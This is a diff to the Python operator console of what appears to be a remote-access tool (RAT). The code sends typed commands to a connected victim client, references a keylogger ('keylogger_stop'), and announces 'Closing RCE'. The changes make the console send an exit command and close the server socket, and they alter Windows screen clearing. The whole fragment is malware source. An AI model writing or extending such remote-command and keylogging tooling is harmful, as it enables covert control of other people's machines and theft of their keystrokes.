@@ -106,6 +106,8 @@ X  \...X     @#%,.@                      @#%,.@     X.../  X
                 # Exiting keyword
                 if message_command == "exit":
                     print("Closing RCE... Bye o/")
+                    self.client.send("exit".encode())
+                    self.server.close()
                     sys.exit()
 
                 if message_command == "keylogger_stop":
@@ -133,8 +135,7 @@ X  \...X     @#%,.@                      @#%,.@     X.../  X
                 if message_command == "clear" and sys.platform.startswith("Linux") == True:
                     os.popen("clear")
                 if message_command == "clear"and sys.platform.startswith("Windows") == True:
-                    subprocess.check_output(f"cls", stderr=subprocess.STDOUT, shell=True)
-                    
+                    subprocess.Popen(f"cls", stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
                                
                 message_command_encrypted = message_command.encode()
                 self.client.send(message_command_encrypted)
